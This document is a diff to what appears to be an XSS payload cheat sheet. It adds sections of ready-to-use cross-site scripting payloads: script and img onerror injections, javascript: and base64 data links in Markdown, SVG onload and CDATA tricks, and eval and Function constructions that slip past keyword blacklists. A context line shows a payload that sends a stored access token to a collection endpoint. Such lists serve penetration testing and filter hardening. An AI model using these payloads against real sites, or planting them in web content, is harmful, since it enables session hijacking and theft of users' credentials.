@@ -234,9 +234,67 @@ ____
 <script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
 ```
 
-* #### [XSS in HTML/Applications](#xss_in_app)
-  * ##### [Basic Payload](#basic_payload)
-  * ##### [Img tag payload](#img_tag_payload)
-* #### [XSS in Markdown](#xss_in_markdown)
-* #### [XSS in SVG](#xss_in_svg)
-* #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
+### XSS > <a name="xss_in_app"></a>XSS in HTML/Applications
+### XSS > <a name="basic_payload"></a>Basic Payload
+```html
+<script>alert('XSS')</script>
+
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+
+"><script>alert("XSS")</script>
+
+"><script>alert(String.fromCharCode(88,83,83))</script>
+```
+### XSS > <a name="img_tag_payload"></a>Img tag payload
+```html
+<img src=x onerror=alert('XSS');>
+
+<img src=x onerror=alert('XSS')//
+     
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+
+"><img src=x onerror=alert("XSS");>
+
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+```
+
+### XSS > <a name="xss_in_markdown"></a>XSS in Markdown
+```html
+[a](javascript:prompt(document.cookie))
+
+[a](j a v a s c r i p t:prompt(document.cookie))
+
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+
+[a](javascript:window.onerror=alert;throw%201)
+```
+### XSS > <a name="xss_in_svg"></a>XSS in SVG
+```html
+<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
+
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+ 
+<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+ 
+<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+### XSS > <a name="bypass_word_blacklist_with_code_evaluation"></a>Bypass word blacklist with code evaluation
+```html
+eval('ale'+'rt(0)');
+
+Function('ale'+'rt(1)')();
+
+new Function`alert`6``;
+
+setTimeout('ale'+'rt(2)');
+
+setInterval('ale'+'rt(10)');
+
+Set.constructor('ale'+'rt(13)')();
+
+Set.constructor`alert(14)```;
+```
